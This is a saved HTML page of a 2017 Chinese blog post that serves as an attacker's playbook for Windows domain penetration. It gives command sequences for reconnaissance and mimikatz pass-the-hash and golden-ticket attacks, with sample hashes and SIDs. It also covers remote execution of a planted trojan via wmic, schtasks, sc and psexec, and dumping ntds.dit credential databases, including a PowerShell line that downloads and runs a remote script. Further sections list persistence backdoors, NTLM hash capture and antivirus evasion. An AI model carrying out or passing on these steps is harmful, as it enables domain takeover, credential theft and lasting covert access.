@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>windows内网渗透杂谈</title>
+  <link rel="icon" href="https://bl4ck.in/favicon.ico">
+  <link rel="apple-touch-icon" href="https://bl4ck.in/public/img/head.png">
+  <link rel="stylesheet" href="windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%9D%82%E8%B0%88_files/amazeui.css">
+  <link rel="stylesheet" href="windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%9D%82%E8%B0%88_files/app.css">
+  <link rel="stylesheet" href="windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%9D%82%E8%B0%88_files/github.css">
+</head>
+<body>
+
+<div class="am-container lp-container">
+  <header class="am-topbar lp-topbar">
+    <h1 class="am-topbar-brand">
+      <a href="https://bl4ck.in/">Tomato's Blog</a>
+    </h1>
+    <button class="am-topbar-btn am-topbar-toggle am-btn am-btn-sm am-btn-danger am-show-sm-only" data-am-collapse="{target: '#lp-topbar-collapse'}"><span class="am-sr-only">导航切换</span> <span class="am-icon-bars"></span></button>
+    <div class="am-collapse am-topbar-collapse am-topbar-right" id="lp-topbar-collapse">
+      <ul class="am-nav am-nav-pills am-topbar-nav">
+        <li><a href="https://bl4ck.in/">Archives</a></li>
+        <!-- <li><a href="#">Categories</a></li> -->
+        <li><a href="https://bl4ck.in/friends.html">Friends</a></li>
+        <!-- <li><a href="#">About Me</a></li> -->
+        <li><a href="https://bl4ck.in/feed.xml">Feed</a></li>
+      </ul>
+    </div>
+  </header>
+</div>
+
+
+<div class="am-container lp-container">
+  <div class="lp-post">
+    <div class="lp-post-header">
+      <h1 class="lp-post-title">windows内网渗透杂谈</h1>
+      <div class="lp-post-meta">
+        <i class="am-icon-calculator"></i><span class="lp-post-date">2017-03-20</span>
+        <i class="am-icon-tags"></i><span class="lp-post-tags">penetration</span>
+      </div>
+    </div>
+    <div class="lp-post-content">
+    <h1 id="windows内网渗透杂谈">windows内网渗透杂谈</h1>
+<hr>
+<h3 id="域渗透">域渗透</h3>
+<ol>
+  <li>域信息收集</li>
+  <li>获取域权限</li>
+  <li>dump域hash</li>
+  <li>权限维持</li>
+</ol>
+
+<h3 id="工作组渗透">工作组渗透</h3>
+<ol>
+  <li>常规内网渗透</li>
+  <li>各种欺骗攻击</li>
+</ol>
+
+<hr>
+
+<h2 id="域渗透-1">域渗透</h2>
+<h3 id="域信息收集">域信息收集</h3>
+<h4 id="0x01-查询当前域信息">0x01 查询当前域信息</h4>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>net view /domain
+net config workstation
+net group "Domain Admins" /domain
+net time /domain
+ipconfig /all
+nslookup xxx
+dsquery server
+
+查看域控制器
+net group "Domain controllers"
+
+查询所有计算机名称(windows 2003)
+
+dsquery computer
+
+下面这条查询的时候,域控不会列出
+
+net group "Domain Computers" /domain
+
+</code></pre>
+</div>
+<p><img src="windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%9D%82%E8%B0%88_files/2017-03-20-14816910178725.jpg" alt="">
+<img src="windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%9D%82%E8%B0%88_files/2017-03-20-14816926950901.jpg" alt=""></p>
+
+<p>还可以通过powershell进行信息搜集,收集的信息包括域控机器，网段信息，域内服务列表。使用powershell的话，首先要绕过默认的安全策略，具体看文章<a href="https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/">https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/</a></p>
+
+<p><code class="highlighter-rouge">PowerSploit\Recon\PowerView.ps1</code></p>
+
+<p>powerview Get-NetDomainController  收集域控信息
+具体的可以看看powerview的帮助文件
+域内服务信息收集，在域环境中其实无需做端口扫描。直接通过SPN进行信息收集，具体脚本</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>PowerShell-AD-Recon/blob/master/Discover-PSInterestingServices.ps1
+</code></pre>
+</div>
+<p><img src="windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%9D%82%E8%B0%88_files/2017-03-20-14816932370016.jpg" alt=""></p>
+
+<h4 id="0x02域内权限获取">0x02域内权限获取</h4>
+
+<p>1.日常规服务，通过前面收集的服务信息，针对性跑这些服务。其中跑sqlserver弱口令比较好，跑出来了就可以执行命令。</p>
+
+<p>2.抓密码 
+拿到一台域服务器后，首先加载mimikatz的powershell脚本将内置的信息抓取一遍，如果域管理员登录过的话，直接就获取到了域管权限。但是
+在windows2012后mimikatz抓不到明文了(包括打了KB2871997这个补丁的机器)，只能通过修改服务器上面的一些设置来获取，有完
+整的powershell利用脚本。
+<a href="https://github.com/3gstudent/Dump-Clear-Password-after-KB2871997-installed">https://github.com/3gstudent/Dump-Clear-Password-after-KB2871997-installed</a></p>
+
+<p>3.pass the hash 抓到密码破不出来就只能pth了，可以使用mimakatz</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>mimikatz # sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a
+</code></pre>
+</div>
+
+<p>但是打了KB2871997这个补丁后常规的pth不能用了，只能传递administrator这个账号(sid=500),但是可以使用mimikatz任意传递aes256</p>
+
+<p>4.steal token
+当你获取了本地计算机的system权限后，如果这台机器上有域用户跑的进程，就直接可以窃取域账号的token，然后从本地用户组跨入域环境。如果这台机器上有域管的开的进程，那么直接steal token后就可以登录域控了。
+<img src="windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%9D%82%E8%B0%88_files/2017-03-20-14816940742419.jpg" alt=""></p>
+
+<p>5.远程执行命令方法</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>copy muma.exe \\host\c$\windows\temp\foobar.exe ##IPC拷贝木马文件
+</code></pre>
+</div>
+
+<p>WMIC远程运行命令</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>
+wmic /node:host /user:administrator /p 密码 process call create “c:\windows\temp\foobar.exe”
+</code></pre>
+</div>
+<p>powershell remoting 执行命令</p>
+
+<p>schtasks计划任务远程运行</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>schtasks /create /tn foobar /tr c:\windows\temp\foobar.exe
+/sc once /st 00:00 /S host /RU System schtasks /run /tn foobar /S host
+schtasks /F /delete /tn foobar /S host ##清除schtasks
+</code></pre>
+</div>
+
+<p>SC添加服务远程运行命令</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>sc \\host create foobar binpath=“c:\windows\temp\foobar.exe” ##新建服务,指向拷贝的木马路径
+sc \\host start foobar ##启动建立的服务
+sc \\host delete foobar ##完事后删除服务
+
+</code></pre>
+</div>
+
+<p>PStools 远程执行命令</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>psexec.exe \\ip –accepteula -u username -p password program.exe
+
+</code></pre>
+</div>
+<p>PTH+compmgmt.msc
+<img src="windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%9D%82%E8%B0%88_files/2017-03-20-14816949000256.png" alt=""></p>
+
+<p>smb+MOF</p>
+
+<p>smbexec远程执行命令</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>copy execserver.exe \\host\c$\windows\ 
+test.exe ip user password command netshare
+
+</code></pre>
+</div>
+<p>不推荐使用pstools，因为会留下很多痕迹，日志要记录，并且如果禁用NTLM那么psexec无法利用获得的ntlm hash进行远程连接</p>
+
+<p>6.ms14068 &amp;&amp; GPP
+ms14068 可以通过先执行klist purge 然后在用mimikatz注入证书 这样域用户也可以直接使用这个漏洞。
+GPP漏洞介绍 <a href="http://www.91ri.org/14909.html">http://www.91ri.org/14909.html</a></p>
+
+<h4 id="0x03-dump域内hash">0x03 dump域内hash</h4>
+<p>1.非交互式
+QuarkPwDump离线分析
+需要文件：ntds.dit system.hiv
+导出 system.hiv</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>reg save hklm\system system.hiv
+</code></pre>
+</div>
+<p>QuarksPwDump.exe -k  可以获取key</p>
+
+<p>导出ntds.dit</p>
+
+<p>连接到域控之后，上传bat 利用vshadow备份ntds.dit</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>setlocal
+if NOT "%CALLBACK_SCRIPT%"=="" goto :IS_CALLBACK
+set SOURCE_DRIVE_LETTER=%SystemDrive%
+set SOURCE_RELATIVE_PATH=\windows\ntds\ntds.dit
+set DESTINATION_PATH=%~dp0
+@echo ...Determine the scripts to be executed/generated...
+set CALLBACK_SCRIPT=%~dpnx0
+set TEMP_GENERATED_SCRIPT=GeneratedVarsTempScript.cmd
+@echo ...Creating the shadow copy...
+"%~dp0vshadow-2008-x64.exe" -script=%TEMP_GENERATED_SCRIPT% -exec="%CALLBACK_SCRIPT%" %SOURCE_DRIVE_LETTER%
+del /f %TEMP_GENERATED_SCRIPT%
+@goto :EOF
+:IS_CALLBACK
+setlocal
+@echo ...Obtaining the shadow copy device name...
+call %TEMP_GENERATED_SCRIPT%
+@echo ...Copying from the shadow copy to the destination path...
+copy "%SHADOW_DEVICE_1%\%SOURCE_RELATIVE_PATH%" %DESTINATION_PATH%
+</code></pre>
+</div>
+
+<p>新建服务执行</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>sc create backupntds binPath= "cmd /c start c:\windows\temp\ntds.bat"
+sc start backupntds
+sc detele backupntds
+</code></pre>
+</div>
+<p>导出HASH</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>QuarksPwDump.exe -dhd -nt ntds.dit -sf system.hiv -o hash.txt
+</code></pre>
+</div>
+<p>ntdsutil导出</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>ntdsutil snapshot "activate instance ntds" create quit quit
+ntdsutil snapshot "mount {GUID}" quit quit
+copy MOUNT_POINT\windows\ntds\ntds.dit c:\windows\temp\ntds.dit
+ntdsutil snapshot "unmount {GUID}" quit quit
+ntdsutil snapshot "delete {GUID}" quit quit
+</code></pre>
+</div>
+<p>powershell 导出ntds.dit</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>powershell IEX (New-ObjectNet.WebClient).DownloadString( 'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1');Invoke-NinjaCopy -Path "C:\windows\ntds\ntds.dit" -LocalDestination "C:\Users\Administrator\Desktop\ntds.dit"
+</code></pre>
+</div>
+<p>powershell导出后需要修复一下</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>esentutl /p /o ntds.dit
+</code></pre>
+</div>
+
+<ol>
+  <li>交互式</li>
+</ol>
+
+<p>导出ntds.dit</p>
+
+<p>windows2008之后可以使用ntdsutil</p>
+
+<h4 id="0x04权限维持">0x04权限维持</h4>
+<ol>
+  <li>golden ticket
+golden ticket 四要素</li>
+</ol>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>user 用户名
+domain 域完整名称
+sid   获取方式:whoami /all  powerview 里面的  Convert-NameToSid ESRINEA\administrator   psgetsid  -accepteula ESRINEA\administrator (PStoos存在)   mimikatz SID::lookup name
+krbgt ntml hash   mimikatz “@lsadump::dcsync /domain:域完整名称 /user:krbtgt"
+</code></pre>
+</div>
+<p>保存golden ticket</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>mimikatz kerberos::golden /user:administrator /domain:ESRINEA.LOCAL /sid:S-1-5-21-2609584263-878513794-3710365111-500 /krbtgt:EDC094659D9C18F4E320C70838404D43 /ticket:ESRINEA.LOCAL.kirbi
+</code></pre>
+</div>
+
+<p>使用golden ticket</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>mimikatz keberos::ptt ESRINEA.LOCAL.kirbi
+</code></pre>
+</div>
+
+<p><img src="windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%9D%82%E8%B0%88_files/2017-03-20-14817917650651.png" alt=""></p>
+
+<ol>
+  <li>mimikatz Skeleton Key SSP
+Skeleton Key被安装在64位的域控服务器上，支持Windows Server2003—Windows Server2012 
+R2，能够让所有域用户使用同一个万能密码进行登录现有的所有域用户使用原密码仍能继续登录，重启后失效，使用mimikatz就可以安装。</li>
+  <li>记录域控密码
+<a href="https://gist.github.com/mubix/6514311#file-evilpassfilter-cpp">https://gist.github.com/mubix/6514311#file-evilpassfilter-cpp</a></li>
+  <li>dump 域内所有hash</li>
+  <li>常用软件插后门 https://github.com/secretsquirrel/the-backdoor-factory</li>
+  <li>cobalt-strike-persistence
+<a href="https://github.com/Tom4t0/cobalt-strike-persistence">https://github.com/Tom4t0/cobalt-strike-persistence</a></li>
+  <li>EXCHANGE服务器留webshell</li>
+  <li>控制一些vpn账号</li>
+  <li>dump dns解析记录  dump ldap信息</li>
+</ol>
+
+<h2 id="工作组渗透-1">工作组渗透</h2>
+<h2 id="常规内网渗透">常规内网渗透</h2>
+<ol>
+  <li>日服务</li>
+  <li>pass the hash</li>
+</ol>
+
+<h3 id="各种欺骗攻击">各种欺骗攻击</h3>
+<p><a href="https://github.com/SpiderLabs/Responder">https://github.com/SpiderLabs/Responder</a>
+撸下内网一个网站挂上<code class="highlighter-rouge">&lt;img src=\\xxx\\xx&gt;</code>然后执行下面命令，就可以抓取ntlmv2 hash</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>./Responder.py -I eth0 -rPv
+</code></pre>
+</div>
+<p><img src="windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%9D%82%E8%B0%88_files/2017-03-20-14816996917145.jpg" alt=""></p>
+
+<p>SMBRelay Attack</p>
+
+<p><img src="windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%9D%82%E8%B0%88_files/2017-03-20-14817720462479.jpg" alt="">
+impacket</p>
+
+<h3 id="cobaltstrike工具免杀">cobaltstrike工具免杀</h3>
+<p>cobaltstrike+veil</p>
+
+
+    </div>
+    
+    <div id="disqus_thread"></div>
+<script type="text/javascript">
+var disqus_shortname = "tomatos-blog";
+
+/* * * DON'T EDIT BELOW THIS LINE * * */
+(function() {
+var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+  </div>
+</div>
+
+<div class="am-container lp-container">
+  <footer class="am-footer lp-footer">
+    <p>Copyright © 2014-2017 All Rights Reserved</p>
+    <p>Theme By <a href="https://github.com/RickGray/light-post">LightPost</a></p>
+  
+</footer></div>
+
+
+<div data-am-widget="gotop" class="am-gotop am-gotop-fixed">
+  <a href="#top" title="回到顶部">
+    <span class="am-gotop-title">GoTop</span>
+    <i class="am-gotop-icon am-icon-chevron-up"></i>
+  </a>
+</div>
+
+<script src="windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%9D%82%E8%B0%88_files/jquery.js"></script>
+<script src="windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%9D%82%E8%B0%88_files/amazeui.js"></script>
+<script>
+$(document).ready(function(){
+  $.AMUI.progress.start();
+});
+$(window).load(function(){
+  $.AMUI.progress.done();
+});
+</script>
+<script src="windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%9D%82%E8%B0%88_files/highlight.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+<!-- 网站统计代码 -->
+<div hidden="">
+<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1256394309'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s95.cnzz.com/z_stat.php%3Fid%3D1256394309%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script>
+</div>
+<div hidden="">
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?b8f48a0cd4b04ec22678a4cd23fcb9dd";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+</div>
+
+
+</body></html>
